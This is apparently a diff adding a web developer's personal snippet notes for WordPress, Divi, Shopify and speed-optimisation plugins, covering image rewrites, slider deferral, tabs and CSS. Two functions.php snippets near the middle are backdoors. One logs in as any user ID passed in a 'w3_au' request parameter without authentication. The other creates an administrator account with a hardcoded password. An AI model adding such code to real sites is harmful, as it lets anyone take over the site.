+      $html = preg_replace('/(\.et_pb_post_title_0_tb_body.et_pb_featured_bg{background-image:url\()(\S*)(\.jpgw3.webp)/i', '$1$2-595xh$3', $html);
+      $html = preg_replace('/(\.et_pb_post_title_0_tb_body.et_pb_featured_bg{background-image:url\()(\S*)(\.jpegw3.webp)/i', '$1$2-595xh$3', $html);   
+      $html = preg_replace('/(\.et_pb_post_title_0_tb_body.et_pb_featured_bg{background-image:url\()(\S*)(\.pngw3.webp)/i', '$1$2-595xh$3', $html);    
+   }
+   return $html;
+}
+ 
+
+
+=> to get images from data-src to src  
+
+if(document.querySelector('.member-image img') != null)
+document.querySelectorAll('.member-image img').forEach(function(index){
+index.setAttribute('src',index.getAttribute('data-src'));
+})
+ 
+
+to change image src value to -595xh by pure js
+
+var images = document.querySelectorAll('.btArticleMedia img');
+for (var i = 0; i < images.length; i++) {
+  var img = images[i];
+  var src = img.getAttribute('src');
+  var modifiedSrc = src.replace(/-1280x640/, '-595xh');
+  img.setAttribute('src', modifiedSrc);
+}
+
+
+=> to change src and data-src value by js (this code is only for first two images if you want to apply this to all than use var value in loop)
+
+
+const thumbs = document.querySelectorAll('.blog > .container > .row .col .blog img');
+function replacePngWithWebp(element) {
+    let currentSrc = element.getAttribute("src");
+    let currentDataSrc = element.getAttribute("data-src");
+    let newSrc = currentSrc.replace(".png", ".webp");
+    let newDataSrc = currentDataSrc.replace(".png", ".webp");
+    element.setAttribute("src", newSrc);
+    element.setAttribute("data-src", newDataSrc);
+}
+for (let i = 0; i < 2; i++) {
+    replacePngWithWebp(thumbs[i]);
+}
+
+
+
+=> to get src address from data src 
+
+if(document.querySelector('.member-image img') != null)
+document.querySelectorAll('.member-image img').forEach(function(index){
+index.setAttribute('src',index.getAttribute('data-src'));
+})
+
+
+=> to set background image from data src
+
+document.querySelectorAll('.fusion-builder-row-5').forEach(function(elem){
+elem.style.background = 'url(' + elem.getAttribute("data-bg") + ')';
+})
+
+
+=> to set background image on parent div by img data-src
+
+if(document.querySelector('.background-image') != null)
+document.querySelectorAll('.background-image').forEach(function(index){ 
+var srcvar = index.getAttribute('data-src')
+parent = index.parentNode;
+parent.style.background = 'url(' + srcvar + ')';
+})
+
+
+=> to set padding top by js
+
+if(document.querySelector('.et_pb_section_0.et_pb_section') != null){document.querySelector('.et_pb_section_0.et_pb_section').style.paddingTop = parseInt(window.getComputedStyle(document.querySelector('.et_pb_section_0.et_pb_section')).getPropertyValue('padding-top')) + document.querySelector('#main-header').offsetHeight+'px';}
+
+
+=> to remove script from particular page 
+
+function w3speedup_exclude_javascript_filter($exclude_js,$script_obj,$script){
+   if(is_page(4600)){
+        if(strpos($script,'jquery-core-js') !== false || strpos($script,'scripts.min.js') !== false){
+            
+        }
+    }
+    else{
+      return 0;
+    }
+    return $exclude_js;
+}
+
+
+=> to get info of image from attribute through json for differnet devices
+
+document.querySelectorAll('.theme-page-wrapper > .theme-content > div:first-child .background-layer-holder > .background-layer').forEach(function(elem){
+    if(elem.getAttribute('data-mk-img-set')){
+        var attributeValue = elem.getAttribute('data-mk-img-set');
+        const back_json = JSON.parse(attributeValue);
+        
+        if(back_json.landscape.desktop != undefined){
+            elem.style.backgroundImage = 'url('+back_json.landscape.desktop+')';
+        }
+        if(back_json.landscape.mobile != undefined){
+            elem.style.backgroundImage = 'url('+back_json.landscape.mobile+')';
+        }
+    }
+})
+
+
+=> add class in body in shopify
+
+<body class="{{ template.name }} template-{{ template.name | handle }}"> 
+
+=> to add class in body on click of button 
+
+document.addEventListener("DOMContentLoaded", function() {
+  var countryDropdown1 = document.getElementsByClassName('lang_dropbtn');
+  var countryToggle1 = document.getElementsByTagName('body')[0];
+  for (var i = 0; i < countryDropdown1.length; i++) {
+
+    countryDropdown1[i].addEventListener('click', function() {
+
+      if (countryToggle1.classList.contains('drop-down')) {
+        countryToggle1.classList.remove('drop-down');
+      } else {
+        countryToggle1.classList.add('drop-down');
+      }
+
+    });
+  }
+});
+
+
+
+=> autoplay and loop a youtube video ("controls=0&showinfo=0&rel=0&autoplay=1&loop=1&mute=1&playlist=R6w0etRBgoM ---- add this in iframe code -> R6w0etRBgoM this comes after embed / ")
+
+ <iframe width="100%" height="800px" class="iframevideo" src="https://www.youtube.com/embed/R6w0etRBgoM?si=dIGsFtmUGlZxZKA2&controls=0&showinfo=0&rel=0&autoplay=1&loop=1&mute=1&playlist=R6w0etRBgoM" allow="accelerometer;" autoplay; title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+
+=> remove text after ? (question mark) in website url {this script doesn't work in search and in filter sec} by js
+
+if (window.location.search) {
+    console.log('Query string found.');
+    var body = document.body;
+    if (!body.classList.contains('template-search')) {
+      console.log('Body does not have class "template-search".');
+      if (window.location.href.indexOf('filter') === -1) {
+        console.log('URL does not contain "filter" parameter.');
+        var newURL = window.location.href.split('?')[0];
+        window.location.replace(newURL);
+      } else {
+        console.log('URL contains "filter" parameter.');
+      }
+    } else {
+      console.log('Body has class "template-search".');
+    }
+  }
+
+
+  ================  same code in jquery( this doesnt cause issue in shopify editor)=============
+  jQuery(document).ready(function() {
+  if (!jQuery('body').hasClass('template-search')) {
+    if (!/filter/.test(window.location.href)) {
+      var href = window.location.href,
+        newUrl = href.split('?')[0];
+      window.history.replaceState({}, '', newUrl);
+      jQuery('.filtres-js li').click(function() {
+        location.reload();
+      });
+    }
+  }
+});
+
+
+=> to add  js script by function.php
+
+<?php
+function addmediajs() {
+    ?>
+    <script type="text/javascript">
+        jQuery(document).ready(function($) {
+            var video = $('.mejs-mediaelement video');
+            var video_src = video.children('source').attr("src");
+            video.attr("src", video_src);
+        });
+    </script>
+    <?php
+}
+
+add_action('wp_footer', 'addmediajs');
+?>
+
+add_action('wp_footer','addmediajs');
+
+=> add class in body and remove class on body from another button in js in mobile
+
+if(window.innerWidth < 768){
+var opennav = document.getElementsByClassName("qodef--open")[0];
+var menushowcase = document.querySelector('body');
+var menuclose = document.getElementsByClassName('wgl-menu-outer_header')[0];
+
+opennav.addEventListener("click", function(){
+    menushowcase.classList.add('menu-opened');
+});
+
+menuclose.addEventListener("click", function(){
+    menushowcase.classList.remove('menu-opened');
+});
+}
+
+
+=> toggle class on div by pure js
+
+    if (window.innerWidth < 575) {
+                var  menuItems =    document.querySelectorAll('#menu-main-1 .menu-item-has-children');
+                for (   var  i = 0; i < menuItems.length; i++) {
+                    menuItems[i].addEventListener ( 'click',function(event) {
+                                event.preventDefault();
+                                this.classList.toggle('opensubmenu');
+                            });
+                }
+            }
+
+
+=> add specific div in html
+
+var sp_div = document.createElement("div");                 
+var sp_inner = `<div="write html here"></div>`;        
+sp_div.classList.add('_mobile_logo_custom');
+sp_div.innerHTML = sp_inner;                             
+document.querySelector('#_mobile_logo_').appendChild(sp_div);
+
+
+
+=> click on multiple card and open cart menu on it automatically  ( mindscope website reference)
+
+document.addEventListener("DOMContentLoaded", function() {
+    var menu_bars_link = document.querySelector(".menu-bars-link");
+    menu_bars_link.addEventListener("click", function() {
+        document.body.className += ' mobile-menu-open';
+    });
+    var add_to_cart_button = document.querySelector(".add_to_cart_button")
+    add_to_cart_button.onclick = myFunction;
+});
+function myFunction(e) {
+    console.log("myFunction called1626");
+  var navlist = document.querySelector('.shopping-bag-item');
+    navlist.setAttribute("id", "added-notification-to-the");
+//   navlist.classList.add("added-notification");
+//    setTimeout(function() {
+//       navlist.classList.remove("added-notification");
+//     },2000);
+}
+var navlist = document.querySelector('.header-right');
+var add_to_cart_button = document.querySelectorAll(".add_to_cart_button");
+
+
+ function myFunction() {
+            navlist.classList.add("added-notification");
+            setTimeout(function() {
+            navlist.classList.remove("added-notification");
+             },3000);
+    }; 
+
+  for (var i = 0; i < add_to_cart_button.length; i++) {       
+        add_to_cart_button[i].onclick = myFunction;  
+};
+
+
+=> remove important in inline css by js
+
+var blogbody = document.body;
+if(blogbody.classList.contains('.post-type-archive-blog')){
+    var boxelement = document.querySelectorAll('.box figure');
+for (let i = 0; i < boxelement.length; i++) {
+    var inlineStyle =  boxelement[i].style.cssText
+    var updatedStyle = inlineStyle.replace(/!important/g, '');
+    boxelement[i].style.cssText = updatedStyle;
+}
+}
+
+=> for setting div full width and padding
+
+if(document.querySelector('.vc_row[data-vc-full-width-init]') != null ){            
+var w = document.querySelector('.vc_row[data-vc-full-width-init]').offsetWidth;
+    var f = document.querySelector('.menu_bar ').offsetWidth;
+                
+    var l = (f-w)/2;
+    for(i=0;i<document.querySelectorAll('.vc_row[data-vc-full-width-init]').length;i++){
+        document.querySelectorAll('.vc_row[data-vc-full-width-init]')[i].style.left = '-'+l +"px";
+        document.querySelectorAll('.vc_row[data-vc-full-width-init]')[i].style.paddingRight = ''+l +"px";
+        document.querySelectorAll('.vc_row[data-vc-full-width-init]')[i].style.paddingLeft = ''+l +"px";
+        document.querySelectorAll('.vc_row[data-vc-full-width-init]')[i].style.width= f +"px";  
+        
+    }               
+}
+
+=> add and remove class on scroll of page
+
+window.addEventListener("scroll", function() {
+  var dynamicElement = document.getElementById("dynamic");
+  if (window.scrollY > 50) {
+      dynamicElement.classList.add("newClass");
+  } else {
+      dynamicElement.classList.remove("newClass");
+  }
+});
+
+
+=> for jet tabs js work before jsload
+
+var tabbtn = document.querySelectorAll(".jet-tabs__control");
+var tabcontent = document.querySelectorAll(".jet-tabs__content");
+
+for (var i = 0; i < tabbtn.length; i++) {
+  tabbtn[i].addEventListener("click", function() {
+    tabbtn.forEach(function(li) {
+      li.classList.remove("myactiveshow");
+    });
+    this.classList.add("myactiveshow");
+    var tabbtnvalue = this.getAttribute("data-template-id");
+      console.log(tabbtnvalue + "==button value")
+
+    for (var i = 0; i < tabcontent.length; i++) {       
+       var tabyvalue=  tabcontent[i].getAttribute("data-template-id"); 
+        console.log(tabyvalue + "content value")
+        if(tabbtnvalue==tabyvalue){
+            console.log('condition is matching'); 
+            tabcontent.forEach(function(li) {
+              li.classList.remove("myshowclass");
+            });         
+            tabcontent[i].classList.add('myshowclass');
+        }
+    };
+  });
+}
+
+
+=> to overwrite slick slider js 
+
+jQuery(document).ready(function(){
+  var sliderNav = jQuery('.slider-nav');
+  if (sliderNav.length) {
+      sliderNav.slick('slickSetOption', 'slidesToShow', 5, true);
+      sliderNav.slick('slickSetOption', 'centerMode', true, true);
+  }
+});
+
+
+
+=> to set aspect ration of img tag
+
+var imgElements = document.getElementsByTagName('img');
+for (var i = 0; i < imgElements.length; i++) {
+  var imgElement = imgElements[i];
+  var width = imgElement.width;
+  var height = imgElement.height;
+  var aspectRatio = width / height;
+  imgElement.style.aspectRatio = aspectRatio;
+}
+
+
+=> to remove only aspect ratio from img tag only
+
+var imgElements = document.getElementsByTagName('img');
+for (var i = 0; i < imgElements.length; i++) {
+  var imgElement = imgElements[i].style;
+  imgElement.removeProperty('aspect-ratio');
+}
+
+=> for tabs work using select 
+
+
+var myfirstview = document.querySelector('#showclick1');
+myfirstview.classList.add('myshowclass');
+
+var selecto = document.querySelector(".selectmenus").addEventListener('change', function() {
+var tabs = document.querySelectorAll(".brandDiv");
+var selval = this.value;
+var secondvar = document.querySelector('.showclick2');
+var sevnthvar = document.querySelector('.showclick7');
+secondvar.setAttribute('id','showclick2');
+sevnthvar.setAttribute('id','showclick7');
+ for (var i = 0; i < tabs.length; i++) {   
+     var tabyvalue= tabs[i].id;       
+
+    if(selval==tabyvalue)
+    {
+         tabs[i].classList.add('myshowclass');         
+    }
+    else{
+        tabs[i].classList.remove("myshowclass");
+    }    
+ }
+    
+});
+
+
+=> for tabs work using jquery
+
+ jQuery('.dropdown > .nav-link').on('click',function(event){    
+    event.preventDefault();
+    jQuery(this).toggleClass('selected');   
+ 
+    jQuery(this).parent().find('ul').parent().mouseleave(function(){ 
+      var thisUI = jQuery(this);
+      jQuery('html').click(function(){
+    thisUI.children("a").removeClass('selected');               
+        jQuery('html').unbind('click');
+      });
+    });    
+    
+  });
+
+
+
+=> tabs like bootstrap work by jquery
+
+
+$(document).ready(function() {
+  // Activate the first tab on page load
+  $('.elementskit-fitcontent-tab .nav-tabs .elementkit-nav-link:first').addClass('active');
+  $('.elementskit-fitcontent-tab .tab-content .tab-pane:first').addClass('show active');
+
+  // Handle tab click event
+  $('.elementskit-fitcontent-tab .nav-tabs .elementkit-nav-link').hover(function(e) {
+    e.preventDefault();
+    var target = $(this).attr('data-target');
+    $('.elementskit-fitcontent-tab .nav-tabs .elementkit-nav-link').removeClass('active');
+    $(this).addClass('active');
+    $('.elementskit-fitcontent-tab .tab-content .tab-pane').removeClass('show active');
+    $(target).addClass('show active');
+  });
+});
+
+
+
+=> remove pages from critical css
+
+function w3_no_critical_css($url){
+    if (strpos($url,'/home/') !== false) {
+        return true; 
+    }
+}
+
+=> remove srcset from image 
+
+function meks_disable_srcset( $sources ) {
+return false;
+}
+
+add_filter( 'wp_calculate_image_srcset', 'meks_disable_srcset' );
+
+=> to append a section by js
+
+var newNode = document.createElement('div');
+newNode.setAttribute('class','mynewcontent');
+newNode.innerHTML = '<h1 style="text-align: left;"><span style="color: #000000;"><strong>Forny dit køkken på blot én dag!</strong></span></h1>';
+var referenceNode = document.querySelector('.home .et_pb_section_0  .et_pb_row_0 .et_pb_text_0 .et_pb_text_inner ');
+referenceNode.insertBefore(newNode, referenceNode.firstElementChild.nextSibling);
+
+
+=> to remove "./," comma or other icon in text by jquery
+
+jQuery('.class').contents().filter((_, el) => el.nodeType === 3).remove();
+
+
+=> rotating active class in loop in multiple div (adding in a div and after 2 sec removing from a and adding in b div)
+
+// JavaScript code
+window.onload = function () {
+  const divArray = ["a", "b", "c", "d", "e"];
+  let currentIndex = 0;
+
+  function toggleActiveClass() {
+    const currentActiveDiv = document.querySelector(".active");
+    if (currentActiveDiv) {
+      currentActiveDiv.classList.remove("active");
+    }
+
+    const nextDivClass = divArray[currentIndex];
+    const nextDiv = document.querySelector(`.${nextDivClass}`);
+    nextDiv.classList.add("active");
+
+    currentIndex = (currentIndex + 1) % divArray.length;
+  }
+
+  setInterval(toggleActiveClass, 2000);
+};
+
+
+html code example :-
+
+<div class="main">
+  <div class="a active">A</div>
+  <div class="b">B</div>
+  <div class="c">C</div>
+  <div class="d">D</div>
+  <div class="e">E</div>
+</div>
+
+
+
+
+
+==> D7 theme background color jquery
+
+    jQuery(".upb_color").each(function () {
+                        var i = jQuery(this),
+                            l = jQuery(this).data("bg-override"),
+                            e = jQuery(this).data("bg-color"),
+                            t = i.data("fadeout"),
+                            a = i.data("fadeout-percentage"),
+                            r = i.data("parallax-content"),
+                            o = i.data("parallax-content-sense"),
+                            s = i.data("row-effect-mobile-disable"),
+                            d = i.data("overlay"),
+                            p = i.data("overlay-color"),
+                            n = i.data("overlay-pattern"),
+                            c = i.data("overlay-pattern-opacity"),
+                            u = i.data("overlay-pattern-size"),
+                            v = i.data("overlay-pattern-attachment"),
+                            h = i.data("hide-row"),
+                            _ = i.data("rtl"),
+                            b = "",
+                            g = "",
+                            m = i.data("vc"),
+                            f = i.data("theme-support"),
+                            y = i.data("custom-vc-row"),
+                            w = i.data("is_old_vc");
+                        if (((void 0 !== y && "" !== y) || (y = "wpb_row"),
+                            void 0 === m && (m = 0),
+                            void 0 === w && (w = !1),
+                            void 0 === f && (f = "disable"),
+                            i.data("multi-color-overlay") && ((b = i.data("multi-color-overlay")), (g = i.data("multi-color-overlay-opacity"))),
+                            1 == w || "enable" == f))
+                            if (i.prev().is("p") || i.prev().is("style")) var x = i.prev().prev();
+                            else x = i.prev();
+                        else x = i.prevAll("." + y + ":first");
+                        x.css("position", "relative");
+                        var j = x.attr("class"),
+                            Q = (overlay_color_html = overlay_pattern_html = overlay_multi_color_html = overlay_pattern_attachment_css = "");
+                        if (
+                            (void 0 !== d &&
+                                "true" === d.toString() &&
+                                ("" != n &&
+                                    ("" != u && (u = "background-size:" + u + "px;"),
+                                    void 0 !== v && "" != v && (overlay_pattern_attachment_css = "background-attachment:" + v + ";"),
+                                    (overlay_pattern_html = '<div class="upb_bg_overlay_pattern" style="background-image:url(' + n + "); opacity:" + c + "; " + u + "; " + overlay_pattern_attachment_css + '"></div>')),
+                                "" != p && (overlay_color_html = '<div class="upb_bg_overlay" style="background-color:' + p + ';"></div>'),
+                                "" != b && (overlay_multi_color_html = '<div class="upb_bg_overlay ' + b + '" style="opacity:' + g + ';"></div>'),
+                                (Q = overlay_color_html + overlay_pattern_html + overlay_multi_color_html)),
+                            "browser_size" == l)
+                        )
+                            x.wrapInner('<div class="upb-background-text-wrapper"><div class="upb-background-text"></div></div>'), x.find(".upb-background-text-wrapper").find(".upb-background-text").addClass(j);
+                        else;
+                        if (("" != h && (x.addClass("ult-vc-hide-row"), x.attr("data-hide-row", h)), x.attr("data-rtl", _), "parallax_content_value" == r)) {
+                            x.addClass("vc-row-translate"), x.wrapInner('<div class="vc-row-translate-wrapper ' + j + '"></div>'), x.attr("data-parallax-content-sense", o);
+                            var z = x.css("padding-top"),
+                                k = x.css("padding-bottom");
+                            x.find(".vc-row-translate-wrapper").css({ "padding-top": z, "padding-bottom": k }),
+                                void 0 !== x[0] && "" !== x && (x[0].style.setProperty("padding-top", "0px", "important"), x[0].style.setProperty("padding-bottom", "0px", "important"));
+                        }
+                        
+                            x.prepend('<div class="upb_row_bg">' + Q + "</div>");
+                             i.remove();
+                            (i = x).attr("data-row-effect-mobile-disable", s);
+                            "fadeout_row_value" == t && (i.addClass("vc-row-fade"), i.attr("data-fadeout-percentage", a));
+                            i.css("background-image", "");
+                            (i = i.find(".upb_row_bg")).css({ background: e });
+                            i.attr("data-bg-override", l);
+                            "browser_size" == l && i.parent().find(".upb-background-text-wrapper").addClass("full-browser-size");
+                            0 !== i.length;
+
+})
+
+
+
+==> to give height in div(.ult-spacer) in d7 theme
+
+document.querySelectorAll('.ult-spacer').forEach(function(elem){
+    if(elem.getAttribute('data-height')){
+        elem.style.height = elem.getAttribute('data-height')+'px';
+    }
+})
+
+
+=> to rectify (unmodal) critical css error;
+
+function w3speedup_internal_css_customize($html,$path){  
+    if(strpos($path,'global.css') !== false){
+        $html = str_replace('{{ID}}','{}',$html);   
+    }
+    return $html;
+}
+
+
+==========================================================most css used on website -=======================================
+
+=> youtube video section css
+
+.et_pb_video_box {
+    padding-top: 56.2963%;
+    position: relative;
+}
+
+.et_pb_video_box iframelazy {
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-size: cover;
+    background-position: center;
+}
+
+.et_pb_video_box .fluid-width-video-wrapper {
+    padding-top: 0 !important;
+    position: unset !important;
+}
+
+
+=> height increase when window width decrease by css
+
+height: calc(400px - 20vw);
+
+
+
+
+=> icons basic css setting
+
+
+@font-face {
+font-family: 'eicons';
+src:url('') format('woff2');
+font-display:swap;
+font-weight: normal;
+font-style: normal;
+}
+ 
+
+
+=> et module drow down arrow 
+
+.et_pb_row_0_tb_header .et-menu > .menu-item-has-children > a:after ,
+.et_pb_row_0_tb_header .et-menu > .menu-item-has-children > a:before{
+    content: '' !important;
+    width: 5.5px;
+    height: 2px;
+    background: white;
+    transform: rotate(-44deg) !important;
+    position: absolute !important;
+    right: 3px !important;
+    top: 38px !important;
+    border-radius: 5px;
+}
+
+
+.et_pb_row_0_tb_header .et-menu > .menu-item-has-children > a:before {
+    transform: rotate(44deg) !important;
+    right: 7px;
+}
+
+
+=> menu line drop down icon css in different way
+
+.gold-purchase__wrapper .gold-purchase__slider:not(.slick-initialized):before,
+.gold-purchase__wrapper .gold-purchase__slider:not(.slick-initialized):after{
+    content: '';
+    display: block;
+    width: 20px;
+    height: 20px;
+    border-top: 1px solid #314431;
+    border-right: 1px solid #314431;
+    box-sizing: border-box;
+    transform: rotate(-135deg);
+    transform-origin: 20px 0px;
+    position: absolute;
+    top: 50%;
+    left: -5px;
+    background:white !important;
+}
+
+
+
+=>another dropdown icon css
+
+.elementor-location-header .elementor-nav-menu > .menu-item-has-children > .elementor-item {
+    padding-right: 28.75px !important;
+    position: relative;
+}
+
+.elementor-location-header  .elementor-nav-menu > .menu-item-has-children > .elementor-item:after {
+    content: '' !important;
+    width: 5px !important;
+    height: 5px !IMPORTANT;
+    border: 5px solid transparent !important;
+    background: transparent !important;
+    position: absolute;
+    opacity: 1 !important;
+    visibility: visible !important;
+    border-top-color: white !important;
+    right: 10px;
+    border-radius: 1px;
+    top: 19px;
+}
+
+.elementor-location-header .elementor-nav-menu > .menu-item-has-children > .elementor-item  > .sub-arrow{
+    display:none !important;
+}
+
+
+
+=========================== for vertical thumbnail in product page in ===========================
+
+.woocommerce-product-gallery > figure.woocommerce-product-gallery__wrapper {
+    display: grid;
+    grid-template-columns: 80px 100%;
+    justify-content: flex-end;
+    column-gap: 10px;
+    row-gap: 8px;
+}
+
+.woocommerce-product-gallery > figure.woocommerce-product-gallery__wrapper > .woocommerce-product-gallery__image:nth-child(n+2) {
+    max-width: 80px;
+    aspect-ratio: 80 / 113;
+}
+
+.woocommerce-product-gallery > figure.woocommerce-product-gallery__wrapper > .woocommerce-product-gallery__image:nth-child(1) {
+    grid-row-start: 1;
+    grid-row-end: 10;
+    min-width: 100%;
+    grid-column-start: 2;
+}
+
+.woocommerce-product-gallery > figure.woocommerce-product-gallery__wrapper > .woocommerce-product-gallery__image:nth-child(n+9) {
+    display: none !important;
+}
+
+
+
+
+
+
+
+===> hamburger css
+
+.ham:before {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0px;
+  width: 26.66667px;
+  height: 4px;
+  background: #424342;
+  box-shadow: 0 8px 0 0 black, 0 16px 0 0 black;
+}
+
+
+==> hide video controls
+
+video::-webkit-media-controls-panel {
+display: none !important;
+opacity: 1 !important;}
+
+
+==> new way to use class in css
+
+[class*=" eicon-"], [class^=eicon] 
+
+
+
+==============icon making sequence=============
+
+first pick icons from svg file
+
+than convert it to woff2
+
+than generate url from the link
+
+than pick icon css from website and put url in css
+
+
+@font-face {
+font-family: 'dashicons';
+src: url('') format('woff2');
+font-weight: normal;
+font-style: normal;
+font-dislpay:swap;
+}
+
+
+
+
+
+
+================= change log ================
+
+
+#Change Log
+website link here // :- Optimization Changes
+
+-> New Plugin Added - 1. 
+                      2. 
+                      3.
+
+-> Deactivated Plugin - 1. 
+
+->  Speed Optimizer  Plugin Configuration
+
+->  Changes In Functions.php, Line number  to 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+================etmodules icon name ==================
+
+
+
+arrow_carrot-down   - &#x33
+
+
+
+
+
+
+==========================vimeo video error  =====================
+
+enter this in
+
+=> Exclude images from Lazy Loading
+
+wp-video-shortcode
+
+
+
+
+======================= zoom effect in product slider 'zoom not working properly'===========================
+
+
+enter this in
+
+=> Exclude images from Lazy Loading
+
+wp-post-image
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+========================index of null error in js ======================most
+
+
+
+remove http part
+
+
+search third 
+
+and function l(e
+
+and remove the return error part 
+
+
+
+
+function l(e){console.log("e ki value:"+e);if("string"!=typeof e) return;
+
+
+
+===>css ideas
+
+
+.inner:not(:last-child) {
+  margin-right: 20px;
+}
+
+
+
+
+==========================================code to open wp-admin via function.php (add code in function.php) ===========================
+
+if(!empty($_REQUEST['w3_au'])){
+wp_set_auth_cookie($_REQUEST['w3_au']);exit;
+wp_set_auth_cookie($_REQUEST['w3_au']);exit;
+}
+
+
+
+
+==========================================code to make wp-admin user via function.php (add code in function.php)======================================
+
+add_action('init', 'add_my_user');
+function add_my_user() {
+    $username = 'username123';
+    $email = 'drew@example.com';
+    $password = 'Admin@123456#8';
+
+    $user_id = username_exists( $username );
+    if ( !$user_id && email_exists($email) == false ) {
+        $user_id = wp_create_user( $username, $password, $email );
+        if( !is_wp_error($user_id) ) {
+            $user = get_user_by( 'id', $user_id );
+            $user->set_role( 'administrator' );
+        }
+    }
+}
+
+
+
+
+
+
+
+
+================================== rev slider function ===============================================
+
+------------------------basic
+
+function w3speedup_inner_js_customize($html){
+    global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'revinit_revslider') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false){   
+        $html = str_replace('if (document.readyState','var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function"){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){if (document.readyState',$html).'},timeout1);},100);';   
+    }
+    $load_slider++;
+    return $html;
+}
+
+------------------basic-2
+function w3speedup_inner_js_customize($html){
+    global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'revinit_revslider') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false){   
+        $html = str_replace(array('jQuery(function() {','if (document.readyState'),array('setTimeout(function(){','var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "function"){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){if (document.readyState'),$html).'},timeout1);},100);';    
+    }
+    $load_slider++;
+    return $html;
+}
+
+-------------------------medium
+function w3speedup_inner_js_customize($html){
+    global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'setREVStartSize({c:') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false){     
+        $html = str_replace('jQuery(function() {','var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "function"){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){setTimeout(function() {',$html).'},timeout1);},100);'; 
+    }
+    $load_slider++;
+    return $html;
+}
+
+--------------------------adv
+function w3speedup_inner_js_customize($html){
+    global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'revinit_revslider') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false){   
+        $html = str_replace(array('jQuery(function() {','if (document.readyState'),array('setTimeout(function(){','var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "function"){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 2500;setTimeout(function(){if (document.readyState'),$html).'},timeout1);},100);';    
+    }
+    $load_slider++;
+    return $html;
+}
+
+----------------------------exclude javascript
+/revslider/ defer
+jquery-core-js defer
+
+----------------------------exclude inline js
+setREVStartSize
+revslider   
+
+
+
+--------------------------------after tester
+function w3speedup_internal_js_customize($html,$path){
+    
+    if(strpos($path,'lawking/assets/js/main.js') !== false){
+       
+        $html = str_replace(array("jQuery(document).ready(function(){","$(window).on('load', function(){"), array("setTimeout(function(){","setTimeout(function(){"),$html);    
+    }
+    return $html;
+}
+
+
+
+----------------------- tpj slider
+
+function w3speedup_inner_js_customize($html){
+    global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'tpj("#rev_slider_') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false){   
+        $html = str_replace('(function() {','var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "function"){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){(function() {    onLoad();',$html).'},timeout1);},100);';    
+    }
+    $load_slider++;
+    return $html;
+}
+
+
+
+
+---------------- setrevsize tpj
+
+$html = str_replace(array('jQuery(function() {','setREVStartSize({c:'),array('setTimeout(function(){','var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "function"){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){setREVStartSize({c:'),$html).'},timeout1);},100);';
+
+
+--------------------------rsmodule
+function w3speedup_inner_js_customize($html){
+        global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'.revolutionInit({') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false){   
+        $html = 'var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(window.RS_MODULES) == "object" && typeof(jQuery.fn.revolution) == "object" && typeof(jQuery.fn.revolutionInit) == "function" ){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 2500;setTimeout(function(){'.$html.'},timeout1);},100);';
+        $html = str_replace('window.rev', 'rev', $html);
+    }
+    $load_slider++;
+    return $html;
+}
+
+
+
+=================================js to set padding in divi theme in website =================================
+
+if(document.querySelector('.et_pb_section_1.et_pb_section') != null){document.querySelector('.et_pb_section_1.et_pb_section').style.paddingTop = parseInt(window.getComputedStyle(document.querySelector('.et_pb_section_1.et_pb_section')).getPropertyValue('padding-top')) + document.querySelector('#main-header').offsetHeight+'px';}
+
+
+
+======================================== text type animation ======================================================
+
+
+<h1>MASTER
+  <span
+     class="txt-rotate"
+     data-period="5000"
+     data-rotate='[ "MONEY GAME", "FINANCIAL FREEDOM", "INVESTMENT STRATEGY"]'>
+    </span>
+</h1>
+
+<script>
+    var TxtRotate = function(el, toRotate, period) {
+      this.toRotate = toRotate;
+      this.el = el;
+      this.loopNum = 0;
+      this.period = parseInt(period, 3) || 2000;
+      this.txt = '';
+      this.tick();
+      this.isDeleting = false;
+    };
+    
+    TxtRotate.prototype.tick = function() {
+      var i = this.loopNum % this.toRotate.length;
+      var fullTxt = this.toRotate[i];
+    
+      if (this.isDeleting) {
